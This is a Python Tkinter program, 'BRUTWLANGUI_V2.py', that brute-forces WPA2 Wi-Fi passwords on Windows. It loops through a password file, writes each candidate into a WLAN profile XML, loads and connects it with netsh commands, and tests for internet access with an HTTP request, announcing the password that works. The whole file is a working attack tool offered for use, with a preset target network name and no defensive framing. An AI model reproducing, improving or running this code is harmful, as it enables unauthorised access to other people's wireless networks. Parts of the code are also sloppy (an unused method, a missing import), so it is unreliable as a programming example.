import os, requests
from datetime import datetime
from tkinter import *
from tkinter import	messagebox
from time import sleep
import Wgt

class Window:
	def __init__(self):
		self.root = Tk()
		self.root.wm_attributes('-fullscreen', 1)
		self.root.title("BRUTWLANGUI_V2.py")
		self.root.bind("<Escape>", self.withdraw_root)
		self.init_elements_frame()
		self.init_elements_to_frame_params()
		self.init_elements_to_frame_pin_list()
		self.init_elements_to_frame_ssid_list()
		self.init_elements_to_frame_console()
		self.init_elements_to_frame_controls_list()
		self.init_inserts_in_elements_start()
		self.run_script = True
		self.percent_number = 0
		self.threads_run()

	def withdraw_root(self, event):
		print('ESCAPE -- TRUE')

	def init_elements_frame(self):
		self.frame_params = Wgt.WgtFrame().create(self.root,10,10,402,702)
		self.frame_pin_list = Wgt.WgtFrame().create(self.root,420,10,404,504)
		self.frame_ssid_list = Wgt.WgtFrame().create(self.root,830,10,404,504)
		self.frame_controls_list = Wgt.WgtFrame().create(self.root,1240,10,124,710)
		self.frame_console_output = Wgt.WgtFrame().create(self.root, 420, 520, 813, 200)


	def init_elements_to_frame_params(self):
		self.ssid = Wgt.WgtEntry().create(self.frame_params, 'SSID WLAN',0,0)
		self.delay = Wgt.WgtEntry().create(self.frame_params, 'DELAY TIME',0,50)
		self.site = Wgt.WgtEntry().create(self.frame_params, 'TEST SITE',0,100)
		self.code = Wgt.WgtEntry().create(self.frame_params, 'CODE ANSWER',0,150)
		self.time_now = Wgt.WgtEntry().create(self.frame_params, 'TIME NOW',0,200)
		self.time_start = Wgt.WgtEntry().create(self.frame_params, 'TIME START',0,250)
		self.time_last = Wgt.WgtLabel().create(self.frame_params, 'TIME LAST','00:00:00',0,300, font_size=14)
		self.time_predict = Wgt.WgtEntry().create(self.frame_params, 'TIME PREDICT',0,350)
		self.pin_all_count = Wgt.WgtEntry().create(self.frame_params, 'PIN ALL',0,400)
		self.pin_now_count = Wgt.WgtEntry().create(self.frame_params, 'PIN NOW',0,450)
		self.pin_test = Wgt.WgtLabel().create(self.frame_params, 'PIN TEST','  ----',0,500, font_size=14)
		self.progress_perc = Wgt.WgtLabel().create(self.frame_params, 'PROGRESS','0%',0,550,font_size=14)
		self.pin_data_file = Wgt.WgtEntry().create(self.frame_params, 'PIN DATA',0,600)
		self.xml_data_file = Wgt.WgtEntry().create(self.frame_params, 'XML DATA',0,650)
		self.type_defined = Wgt.WgtEntry().create(self.frame_params, 'TYPE DEFINED',0,650)

	def init_elements_to_frame_pin_list(self):
		self.pin_list = Wgt.WgtConsole().create(self.frame_pin_list,0,0,400,500, size_font=25)

	def init_elements_to_frame_ssid_list(self):
		self.ssid_list = Wgt.WgtConsole().create(self.frame_ssid_list,0,0,400,500, size_font=11)

	def init_elements_to_frame_console(self):
		self.console_output = Wgt.WgtConsole().create(self.frame_console_output,0,0,810,197, size_font=13)

	def init_elements_to_frame_controls_list(self):
		self.button_play = Wgt.WgtButton().create(self.frame_controls_list,"PLAY",0,0,h=100,com=self.command_play)
		self.button_pause = Wgt.WgtButton().create(self.frame_controls_list,"PAUSE",0,100, com=self.command_pause)
		self.button_stop = Wgt.WgtButton().create(self.frame_controls_list,"STOP",0,150, com=self.command_stop)
		self.button_reset = Wgt.WgtButton().create(self.frame_controls_list,"RESET",0,200, com=self.command_reset)
		self.button_try_pin = Wgt.WgtButton().create(self.frame_controls_list,"TRY PIN",0,250, com=self.command_try_pin)
		self.button_skin = Wgt.WgtButton().create(self.frame_controls_list,"SKIN",0,300)
		self.button_info = Wgt.WgtButton().create(self.frame_controls_list,"INFO",0,350, com=self.command_info)
		self.button_save = Wgt.WgtButton().create(self.frame_controls_list,"SAVE",0,400)
		self.button_view_xml = Wgt.WgtButton().create(self.frame_controls_list,"VIEW XML",0,450)
		self.button_beep = Wgt.WgtButton().create(self.frame_controls_list,"BEEP",0,500)
		self.button_apply = Wgt.WgtButton().create(self.frame_controls_list,"APPLY",0,550, com=self.command_apply)
		self.button_exit = Wgt.WgtButton().create(self.frame_controls_list,"EXIT",0,600,h=107, com=self.command_exit)

	def init_inserts_in_elements(self):
		os.system('netsh wlan show networks > list_ssid.txt')
		file_ssid = open('list_ssid.txt', 'r', encoding='utf-16le')
		text_ssid = file_ssid.read()
		self.ssid_list.insert(0.0, text_ssid)
		file_pins = open(self.pin_data_file.get(), 'r', encoding='utf-8')
		text_pins = file_pins.read()
		self.pin_list.insert(0.0, text_pins)
		self.time_start.insert(0, '      '+str(datetime.now())[11:-7])

	def calc_time(self, time, time2):
		res = (time - time2)
		res = str(res)
		try:
			res = res[0 : res.index(".")]
		except ValueError:
			pass
		return res

	def threads_run(self):
		self.run_thread_time_now()

	def run_thread_time_now(self):
		self.time_now.delete(0, END)
		self.time_now.insert(0, '      ' + str(datetime.now())[11:-7])
		try:
			self.result_last_time = self.calc_time(datetime.now(), self.time_start_date_now)
			self.time_last['text'] = str(self.result_last_time)
		except AttributeError:
			pass
		self.time_now.after(1000, self.run_thread_time_now)


	def init_inserts_in_elements_start(self):
		self.ssid.delete(0, END)
		self.ssid.insert(0, '       '+'Net62')
		self.delay.delete(0, END)
		self.delay.insert(0, '	 '+'2')
		self.site.delete(0, END)
		self.site.insert(0, 'http://www.google.com')
		self.pin_data_file.delete(0, END)
		self.pin_data_file.insert(0, 'password_data.txt')
		self.code.delete(0, END)
		self.code.insert(0,'	 '+'0')
		self.time_now.delete(0, END)
		self.time_now.insert(0, '      '+str(datetime.now())[11:-7])
		self.pin_now_count.delete(0, END)
		self.pin_now_count.insert(0, '	'+'----')
		self.pin_test['text'] = 'NONE'
		self.type_defined.delete(0, END)
		self.type_defined.insert(0, '      '+'WPA2PSK')
		os.system('netsh wlan show networks > list_ssid.txt')
		file_ssid = open('list_ssid.txt', 'r', encoding='utf-16le')
		text_ssid = file_ssid.read()
		self.ssid_list.delete(0.0, END)
		self.ssid_list.insert(0.0, text_ssid)
		file_pins = open(self.pin_data_file.get(), 'r', encoding='utf-8')
		text_pins = file_pins.read()
		self.pin_list.delete(0.0, END)
		self.pin_list.insert(0.0, text_pins)
		self.pin_all_count.delete(0, END)
		self.pin_all_count.insert(0, '	 '+str(len(text_pins.split("\n"))))
		self.load2 = Wgt.WgtLoaderBarFill().create(self.root, 10, 725, 1340, 25, 0, color_signal='green')
		self.progress_perc = Wgt.WgtLabel().create(self.frame_params, 'PROGRESS','0%',0,550,font_size=14)

	def console_print(self, args):
		# self.console_output.delete(0.0, END)
		self.console_output.insert(0.0, "\n" + str(args))

	def command_stop(self):
		print('stop', self.percent_number)
		try:
			self.root.after_cancel(self.id_function_run_brut)
			print('stop try')
			self.init_inserts_in_elements_start()
		except AttributeError:
			pass

	def command_pause(self):
		print('stop', self.percent_number)
		try:
			self.root.after_cancel(self.id_function_run_brut)
			print('stop try')
			self.init_inserts_in_elements_start()
		except AttributeError:
			pass

	def command_reset(self):
		self.init_inserts_in_elements_start()
		self.console_output.delete(0.0, END)

	def command_try_pin(self):
		r_quest = Toplevel()
		r_quest.title("try pin")
		r_quest.geometry('395x110+500+250')
		self.e = Wgt.WgtEntry.create(r_quest,"PIN CODE", 0,0)
		Wgt.WgtButton.create(r_quest,'APPLY PASSWORD',50,60,300,40, com = self.command_apply_try_pin)
	def command_apply_try_pin(self):
		pin_user = self.e.get()
		new_file = open('try_pin.txt', 'w')
		new_file.write(pin_user)
		new_file.close()
		self.delay.delete(0,END)
		self.delay.insert(0, '	  5')
		self.delay_entry = self.delay.get()
		f_pass = open(self.pin_data_file.get().strip(), 'r')
		self.array_passwd = f_pass.read().split('\n')
		self.pin_data_file.delete(0, END)
		self.pin_data_file.insert(0, 'try_pin.txt')
		file_pins = open(self.pin_data_file.get(), 'r', encoding='utf-8')
		text_pins = file_pins.read()
		self.pin_all_count.delete(0, END)
		self.pin_all_count.insert(0, '	 ' + str(len(text_pins.split("\n"))))
		self.command_apply(True)
		self.command_play()

	def command_info(self):
		new = Toplevel()
		new.geometry('500x500+400+100')


	def command_play(self):
		self.time_start_date_now = datetime.now()
		self.time_start.insert(0, '      '+str(datetime.now())[11:-7])
		self.ssid_entry = self.ssid.get().strip()
		self.delay_entry = int(self.delay.get().strip())
		self.site_entry = self.site.get().strip()
		self.pin_data_file_entry = self.pin_data_file.get().strip()
		self.xml_data_file_entry = self.xml_data_file.get().strip()
		self.type_defined_entry = self.type_defined.get().strip()
		self.wifi = WifiProcess(self.ssid_entry)
		self.command_apply(True)
		self.function_run()

	def function_run(self):
		self.run(self.ssid.get().strip())
		self.load2 = Wgt.WgtLoaderBarFill().create(self.root, 10, 725, 1340, 25, self.percent_number, color_signal='violet')
		self.id_function_run_brut = self.root.after(int(self.delay_entry)*1000, self.function_run)

	def run(self,ssid):
		if self.run_script == True:
			print('pswd::: ', self.array_passwd[self.wifi.counter_passwd-1])
			self.pin_now_count.delete(0,END)
			self.pin_now_count.insert(0, '	 '+str(self.wifi.counter_passwd+1))
			self.percent_number = float(1340 / int(self.pin_all_count.get()) * int(self.pin_now_count.get()) + 1)
			self.progress_perc['text']=str(int(100/int(self.pin_all_count.get()) * int(self.pin_now_count.get())+1))+'%'
			self.code_answer = self.wifi.check_connect(self.site)
			self.code.delete(0,END)
			self.code.insert(0,str(self.code_answer))
			if self.code_answer != 200:
				try:
					self.console_print('[ SELECTED PASSWORD .. ]')
					str_xml = self.wifi.edit_pass(SSID=ssid, PASSWORD=self.array_passwd[self.wifi.counter_passwd])
					self.console_print('[ REWRITE XML FILE .. ]')
					self.wifi.rewrite_xml(str_xml)
					self.console_print('[ APPEND PROFILE WLAN IN SYSTEM .. ]')
					self.wifi.cmd(self.command_add_profile)
					self.console_print('[FILE DATA]  >>>  [ '+ self.DATA_FILE_PASS+ ' ]')
					self.console_print('[№_' + str(self.wifi.counter_passwd + 1) + '/_'+ str(len(self.array_passwd))+
						  ']  >>>  [ TESTING PASSWORD (' + self.array_passwd[self.wifi.counter_passwd] + ') ]')
					self.pin_test['text'] = self.array_passwd[self.wifi.counter_passwd]
					# self.root.update()
					self.wifi.cmd(self.command_connect)
				except IndexError:
					sleep(self.delay_entry)
					self.console_print(' !!! INDEX LIST PASSWORD OF RANGE .. EXITING MAINLOOP ..')
					self.code_answer = self.wifi.check_connect(self.site)
					self.code.delete(0, END)
					self.code.insert(0, str(self.code_answer))
					if self.code_answer == 200:
						self.console_print('\n')
						self.console_print('[ A C C E S S    P A S S W O R D  >>>  [' + self.array_passwd[self.wifi.counter_passwd-1] + ']  ]')
						self.console_print('\n')
						self.pin_test['text'] = '!-> '+self.array_passwd[self.wifi.counter_passwd-1]
						messagebox.showinfo('RESULT', 'PIN:\n'+str(self.array_passwd[self.wifi.counter_passwd-1]))
						self.run_script = False
					else :

						self.pin_test['text'] = '!-> ' + self.array_passwd[self.wifi.counter_passwd - 1]
						messagebox.showinfo('RESULT', 'PIN:\n' + str(self.array_passwd[self.wifi.counter_passwd - 1]))
					self.run_script = False

			elif self.code_answer == 200:
				self.console_print('\n')
				self.console_print('[ A C C E S S    P A S S W O R D  >>>  [' + self.array_passwd[self.wifi.counter_passwd-1] + ']  ]')
				self.console_print('\n')
				self.pin_test['text'] = '!-> '+self.array_passwd[self.wifi.counter_passwd-1]
				messagebox.showinfo('RESULT', 'PIN:\n'+str(self.array_passwd[self.wifi.counter_passwd-1]))
				self.run_script = False
			else:
				self.console_print('\n')
				self.console_print('[ T R Y    P A S S W O R D  >>>  [' + self.array_passwd[self.wifi.counter_passwd] + ']  ]')
				self.console_print('\n')
				self.pin_test['text'] = 'TRY '+self.array_passwd[self.wifi.counter_passwd]
				self.run_script = False
			self.wifi.counter_passwd += 1

	def end(self):
		self.root.mainloop()

	def command_apply(self,event):
		self.DATA_FILE_PASS = str(os.getcwd()) + '\\' + self.pin_data_file.get()
		DELAY = self.delay.get()
		self.console_print('\n[ SAVING .. ]\n')
		path_xml = str(os.getcwd()) + "\\" + str(self.ssid.get().strip()) + '.xml'
		self.command_add_profile = ('netsh wlan add profile filename={0} interface="""Беспроводная сеть"""').format(
			path_xml)
		self.command_connect = 'netsh wlan connect name="{0}"'.format(self.ssid.get().strip())
		self.console_print('PATH FILE XML > [' + path_xml + ']')
		self.console_print('DEFINED WLAN > [' + self.type_defined.get().strip() + ']')
		self.console_print('COMMAND ADD PROFILE > [' + self.command_add_profile + ']')
		self.console_print('COMMAND CONNECT PROFILE > [' + self.command_connect + ']')
		self.console_print('DELAYED SEC BEATWEEN TESTING PASSWORD > [' + str(DELAY) + ']')
		self.console_print("_______________________________________________________")
		self.console_print('\n\n')
		self.console_print('\n[ UNPACKING DATA FILE PASSWORDS ]')
		f_pass = open(self.pin_data_file.get().strip(), 'r')
		self.array_passwd = f_pass.read().split('\n')
		self.console_print('[ ALL COUNT PASSWORDS >> [{0}] ]'.format(len(self.array_passwd)))
		self.console_print('[ COMPLETED LOADING PASSWORD IN PROGRAMM ]\n')
		self.console_print('[ All Time for brutforce password ] > [ ' + str(
			int(len(self.array_passwd) * float(self.delay.get().strip()) / 60)) + ' min ]\n')

	def command_exit(self):
		answer_quit_user = messagebox.askyesno('EXITING', 'DO YOU HAVE EXIT ?')
		if answer_quit_user == True:
			sys.exit()
		else:
			pass


class WifiProcess:
	def __init__(self, name_xml_file):
		self.name_xml_file = name_xml_file
		self.name_type_defined = 'WPA2PSK'
		self.TEST_CONNECT_SITE = "http://www.google.com"
		self.counter_passwd = 0

	def edit_pass(self, SSID, PASSWORD='00000000', TYPE='WPA2PSK'):
		struct_xml = """
	<?xml version="1.0"?>
	<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
		<name>{name}</name>
		<SSIDConfig>
			<SSID>
				<name>{name}</name>
			</SSID>
		</SSIDConfig>
		<connectionType>ESS</connectionType>
		<connectionMode>auto</connectionMode>
		<MSM>
			<security>
				<authEncryption>
					<authentication>{type_def}</authentication>
					<encryption>AES</encryption>
					<useOneX>false</useOneX>
				</authEncryption>
				<sharedKey>
					<keyType>passPhrase</keyType>
					<protected>false</protected>
					<keyMaterial>{passwd}</keyMaterial>
				</sharedKey>
			</security>
		</MSM>
		<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
			<enableRandomization>false</enableRandomization>
			<randomizationSeed>3942810922</randomizationSeed>
		</MacRandomization>
	</WLANProfile>
		""".format(name=SSID, passwd=PASSWORD, type_def=TYPE)
		# print(struct_xml)
		return struct_xml.strip()

	def check_connect(self, TEST_CONNECT_SITE = 'http://unblock.mts.ru'):
		try:
			answer = requests.get(url=TEST_CONNECT_SITE)
			# print(answer.status_code)
			return answer.status_code
		except:
			return 0

	def cls(self):
		os.system('cls')

	def cmd(self, command):
		os.system(command+' > output_in_loop_while.txt')

	def rewrite_xml(self, str_text):
		f = open('{0}.xml'.format(self.name_xml_file), 'w')
		f.write(str_text)
		f.close()


#
# try:
# 	win = Window()
# 	win.end()
# except:
# 	messagebox.showerror('ERROR','++++')
# 	print('except')


win = Window()
win.end()